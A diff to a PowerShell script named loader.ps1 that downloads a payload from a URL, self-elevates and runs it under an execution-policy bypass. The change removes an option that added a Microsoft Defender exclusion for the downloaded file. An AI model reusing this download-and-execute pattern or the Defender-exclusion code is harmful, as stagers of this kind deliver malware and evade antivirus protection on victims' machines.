@@ -15,8 +15,7 @@
 #
 # Usage:
 #   powershell -nop -ep bypass -File loader.ps1 [-Url <u>] [-OutFile <p>]
-#              [-NoRun] [-NoElevate] [-AddDefenderExclusion]
-#              [-Retries 3] [-TimeoutSec 40]
+#              [-NoRun] [-NoElevate] [-Retries 3] [-TimeoutSec 40]
 #
 # Exit codes: 0 = success (or -NoRun download-only) | 2 = all downloads failed
 #             4 = payload execution failed
@@ -27,7 +26,6 @@ param(
     [string]$OutFile = '',
     [switch]$NoRun,
     [switch]$NoElevate,
-    [switch]$AddDefenderExclusion,
     [int]$Retries = 3,
     [int]$TimeoutSec = 40
 )
@@ -106,7 +104,6 @@ function Invoke-ElevatedRestart {
     $a.Add('-Url');               $a.Add(('"{0}"' -f $Url))
     $a.Add('-OutFile');           $a.Add(('"{0}"' -f $OutFile))
     if ($NoRun)                { $a.Add('-NoRun') }
-    if ($AddDefenderExclusion) { $a.Add('-AddDefenderExclusion') }
     $a.Add('-Retries');           $a.Add([string]$Retries)
     $a.Add('-TimeoutSec');        $a.Add([string]$TimeoutSec)
 
@@ -257,15 +254,6 @@ if (-not $isAdmin -and -not $NoElevate) {
 }
 
 Enable-Perms
-
-if ($AddDefenderExclusion) {
-    try {
-        Add-MpPreference -ExclusionPath $OutFile -ErrorAction Stop
-        Write-Log ('Defender exclusion added for {0}' -f $OutFile)
-    } catch {
-        Write-Log ('Could not add Defender exclusion (admin required?): {0}' -f $_.Exception.Message) 'WARN'
-    }
-}
 
 if (-not (Get-RemoteFile -Source $Url -Destination $OutFile -Attempts $Retries -Timeout $TimeoutSec)) {
     exit 2
